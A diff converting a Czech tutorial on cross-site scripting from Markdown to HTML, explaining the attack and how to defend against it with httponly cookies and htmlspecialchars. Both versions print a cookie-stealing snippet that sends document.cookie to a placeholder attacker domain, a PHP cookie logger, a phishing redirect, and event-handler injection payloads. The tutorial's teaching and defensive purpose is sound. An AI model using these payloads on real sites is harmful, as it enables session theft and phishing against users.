@@ -5,114 +5,106 @@ description: "Jak je možné využít XSS díru na webové stránce a jak XSS �
 date: "2014-06-12"
 last_modification: "2014-06-17"
 status: 1
-tags: ["Bezpečnost"]
+tags: ["zabezpeceni"]
+format: "html"
 ---
 
-XSS (Cross-site scripting) je metoda využívající [bezpečnostní](/bezpecnost) chyby webu, konkrétně nedostatečné ošetření dat.
+<p>XSS (Cross-site scripting) je metoda využívající <a href="/bezpecnost">bezpečnostní</a> chyby webu, konkrétně nedostatečné ošetření dat.</p>
 
-Typicky spočívá ve vložení škodlivého JS kódu. Útok bývá často podceňován, přestože přináší **obrovská risika**.
+<p>Typicky spočívá ve vložení škodlivého JS kódu. Útok bývá často podceňován, přestože přináší <b>obrovská risika</b>.</p>
 
-    **Krádež cookie** – JavaScript má často přístup k datům identifikujícím přihlášeného uživatele. Obsah cookie je v `document.cookie`.
-
-    Útočník vložením škodlivého kódu *pingne* skript na vlastním webu s předanou hodnotou cookie. Potom už stačí, aby napadenou stránku **navštívil administrátor** – jeho cookie se tak pošle útočníkovi. Zákeřnost tohoto útoku spočívá ve skutečnosti, že je velmi obtížné si napadení všimnout. Na venek se web chová normálně.
-
-    Příklad JS kódu, který je potřeba dostat na server.
-
-    ```
-var ping = new Image();
+<ol>
+  <li>
+    <p><b>Krádež cookie</b> – JavaScript má často přístup k datům identifikujícím přihlášeného uživatele. Obsah cookie je v <code>document.cookie</code>.</p>
+       
+    <p>Útočník vložením škodlivého kódu <i>pingne</i> skript na vlastním webu s předanou hodnotou cookie. Potom už stačí, aby napadenou stránku <b>navštívil administrátor</b> – jeho cookie se tak pošle útočníkovi. Zákeřnost tohoto útoku spočívá ve skutečnosti, že je velmi obtížné si napadení všimnout. Na venek se web chová normálně.</p>
+    <p>Příklad JS kódu, který je potřeba dostat na server.</p>
+    
+    <pre><code>var ping = new Image();
 ping.src = "http://domena-utocnika.cz/?" + 
-            encodeURI(document.cookie);
-```
-
-    PHP skript pro uložení obsahu:
-
-    ```
-file_put_contents(
+            encodeURI(document.cookie);</code></pre>
+    
+    <p>PHP skript pro uložení obsahu:</p>
+    
+    <pre><code>file_put_contents(
 	"cookies.txt", 
 	$_SERVER["QUERY_STRING"] . "\n", 
 	FILE_APPEND
-);
-```
+);</code></pre>
+    
+    <p>Přístupu k obsahu cookie z JS <b>lze zabránit</b> nastavením jako <i>httponly</i> v PHP funkci <a href="http://cz2.php.net/manual/en/function.setcookie.php"><code>setcookie</code></a> nebo <a href="http://cz2.php.net/manual/en/function.session-set-cookie-params.php"><code>session_set_cookie_params</code></a>.</p>
+  </li>
+  
+  <li>
+    <p><b>Přesměrování na vlastní web</b> – v případě, že cookie k přihlášení nestačí, nebo je cílem získat hesla, dá se použít technika <i>phishingu</i>. Přesměrovat návštěvníka webu JavaScriptem na vlastní stránku s <b>přihlašovacím formulářem</b> zkopírovaným z originální stránky.</p>
+    
+    <pre><code>window.location = "http://domena-utocnika.cz";</code></pre>
+  </li>
+  
+  <li>
+    <p><b>Modifikace stránky</b> – jelikož JS má takřka neomezenou moc v manipulaci s webovou stránkou, může útočník využitím XSS díry za účelem výdělku přidat na děravou stránku <b>reklamu</b>, <b>affiliate odkazy</b> a podobně.</p>
+  </li>
+  
+  <li>
+    <p><b>Poškození dobrého jména</b> – vložením spojení na nějaký podezřelý web může stránce přiřknout ve vyhledávačích označení jako malware.</p>
+  </li>
+</ol>
 
-    Přístupu k obsahu cookie z JS **lze zabránit** nastavením jako *httponly* v PHP funkci [`setcookie`](http://cz2.php.net/manual/en/function.setcookie.php) nebo [`session_set_cookie_params`](http://cz2.php.net/manual/en/function.session-set-cookie-params.php).
+<h2 id="priklad">Příklad útoku</h2>
 
-    **Přesměrování na vlastní web** – v případě, že cookie k přihlášení nestačí, nebo je cílem získat hesla, dá se použít technika *phishingu*. Přesměrovat návštěvníka webu JavaScriptem na vlastní stránku s **přihlašovacím formulářem** zkopírovaným z originální stránky.
+<h3 id="html-znacky">Interpretace HTML značek</h3>
 
-    ```
-window.location = "http://domena-utocnika.cz";
-```
+<p>V případě, že se obsah, který může ovlivnit návštěvník, vypisuje včetně HTML značek, není problém přidat kus škodlivého JavaScriptu.</p>
 
-    **Modifikace stránky** – jelikož JS má takřka neomezenou moc v manipulaci s webovou stránkou, může útočník využitím XSS díry za účelem výdělku přidat na děravou stránku **reklamu**, **affiliate odkazy** a podobně.
-
-    **Poškození dobrého jména** – vložením spojení na nějaký podezřelý web může stránce přiřknout ve vyhledávačích označení jako malware.
-
-## Příklad útoku
-
-### Interpretace HTML značek
-
-V případě, že se obsah, který může ovlivnit návštěvník, vypisuje včetně HTML značek, není problém přidat kus škodlivého JavaScriptu.
-
-```
-&lt;script>
+<pre><code>&lt;script>
 alert("XSS");
-&lt;/script>
-```
+&lt;/script></code></pre>
 
-Potřebujeme-li umožnit vkládat HTML značky, nezbývá než použít nějaký nástroj pro [pročištění kódu](/vycisteni-kodu), kde jde přímo vyjmenovat povolené HTML značky a atributy.
+<p>Potřebujeme-li umožnit vkládat HTML značky, nezbývá než použít nějaký nástroj pro <a href="/vycisteni-kodu">pročištění kódu</a>, kde jde přímo vyjmenovat povolené HTML značky a atributy.</p>
 
-Není-li potřeba HTML značky interpretovat, postačí PHP funkce `htmlspecialchars`.
+<p>Není-li potřeba HTML značky interpretovat, postačí PHP funkce <code>htmlspecialchars</code>.</p>
 
-### Interpretace v HTML atributech
+<h3 id="html-atributy">Interpretace v HTML atributech</h3>
 
-Méně známý problém je obsah v **HTML atributech**. V PHP existuje funkce `strip_tags`, která slouží k odstranění všeho, co vypadá jako HTML značka (tedy i třeba smajlíka `&lt;3` nebo výrazu `a&lt;b`, což bývá nežádoucí).
+<p>Méně známý problém je obsah v <b>HTML atributech</b>. V PHP existuje funkce <code>strip_tags</code>, která slouží k odstranění všeho, co vypadá jako HTML značka (tedy i třeba smajlíka <code>&lt;3</code> nebo výrazu <code>a&lt;b</code>, což bývá nežádoucí).</p>
 
-Zásadní problém této funkce tkví v neodstraňování atributů. Použitím `strip_tags` a povolení byť jen jediné HTML značky **vznikne XSS díra**.
+<p>Zásadní problém této funkce tkví v neodstraňování atributů. Použitím <code>strip_tags</code> a povolení byť jen jediné HTML značky <b>vznikne XSS díra</b>.</p>
 
-Škodlivý JavaScript je totiž možné vkládat i do různých `onNěco` událostí:
+<p>Škodlivý JavaScript je totiž možné vkládat i do různých <code>onNěco</code> událostí:</p>
 
-```
-&lt;b onmousemove='alert("XSS")'>&lt;b>
-```
+<pre><code>&lt;b onmousemove='alert("XSS")'>&lt;b></code></pre>
 
-Funkce `strip_tags` nastavená na povolení tučného písma (značka `&lt;b>`) tento kód nechá beze změn.
+<p>Funkce <code>strip_tags</code> nastavená na povolení tučného písma (značka <code>&lt;b></code>) tento kód nechá beze změn.</p>
 
-Jelikož `strip_tags` ponechá i *inline* styly, může útočník výše uvedený HTML kód naposicovat přes celou stránku s průhledným pozadím. A po provedení škodící akce element zrušit, aby se web nechoval podezřele.
+<p>Jelikož <code>strip_tags</code> ponechá i <i>inline</i> styly, může útočník výše uvedený HTML kód naposicovat přes celou stránku s průhledným pozadím. A po provedení škodící akce element zrušit, aby se web nechoval podezřele.</p>
 
-```
-&lt;span 
+<pre><code>&lt;span 
 onmousemove="alert('XSS'); this.parentNode.removeChild(this)" 
 style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent">
-&lt;/span>
-```
+&lt;/span></code></pre>
 
-[Živá ukázka](http://kod.djpw.cz/gxdb)
+<p><a href="http://kod.djpw.cz/gxdb">Živá ukázka</a></p>
 
-Při vypisování obsahu **uvnitř HTML atributů** je tedy nutné myslet na to, že když v kódu:
+<p>Při vypisování obsahu <b>uvnitř HTML atributů</b> je tedy nutné myslet na to, že když v kódu:</p>
 
-```
-&lt;h1 title='**%vypis%**'>Nadpis&lt;/h1>
-```
+<pre><code>&lt;h1 title='<b>%vypis%</b>'>Nadpis&lt;/h1></code></pre>
 
-Nahradíme `%vypis%` řetězcem `' onmousemove='alert("XSS")`, vznikne:
+<p>Nahradíme <code>%vypis%</code> řetězcem <code>' onmousemove='alert("XSS")</code>, vznikne:</p>
 
-```
-&lt;h1 title='' onmousemove='alert("XSS")'>Nadpis&lt;/h1>
-```
+<pre><code>&lt;h1 title='' onmousemove='alert("XSS")'>Nadpis&lt;/h1></code></pre>
 
-Což je funkční a **nebezpečný výsledek**.
+<p>Což je funkční a <b>nebezpečný výsledek</b>.</p>
 
-## Obrana před XSS
+<h2 id="obrana">Obrana před XSS</h2>
 
-Důsledná obrana proti XSS spočívá v ošetřování všech dat, která se vypisují na stránce.
+<p>Důsledná obrana proti XSS spočívá v ošetřování všech dat, která se vypisují na stránce.</p>
 
-V PHP je k tomu možné použít funkci `htmlspecialchars`:
+<p>V PHP je k tomu možné použít funkci <code>htmlspecialchars</code>:</p>
 
-```
-$text = htmlspecialchars($text, ENT_QUOTES);
-```
+<pre><code>$text = htmlspecialchars($text, ENT_QUOTES);</code></pre>
 
-Uvedení `ENT_QUOTES` zajistí právě ochranu v HTML atributech – tj. nenechá atribut uzavřít jednoduchou nebo dvojitou uvozovkou, což zabrání zapsání škodlivých `onNěco` atributů.
+<p>Uvedení <code>ENT_QUOTES</code> zajistí právě ochranu v HTML atributech – tj. nenechá atribut uzavřít jednoduchou nebo dvojitou uvozovkou, což zabrání zapsání škodlivých <code>onNěco</code> atributů.</p>
 
-Výše uvedené použití funkce `htmlspecialchars` nahradí entitami všechny řídicí HTML znaky: `&lt;`, `&gt;`, `&amp;`, `&quot;` a `'`.
+<p>Výše uvedené použití funkce <code>htmlspecialchars</code> nahradí entitami všechny řídicí HTML znaky: <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>&quot;</code> a <code>'</code>.</p>
 
-Ošetření výstupu je nutné použít i u všelijakých **administrátorských akcí**. Mohlo by se stát, že by útočník administrátora odkázal na URL, kde by byl kus **škodlivého JS kódu**, který by se bez ošetření po prokliknutí provedl.
+<p>Ošetření výstupu je nutné použít i u všelijakých <b>administrátorských akcí</b>. Mohlo by se stát, že by útočník administrátora odkázal na URL, kde by byl kus <b>škodlivého JS kódu</b>, který by se bez ošetření po prokliknutí provedl.</p>
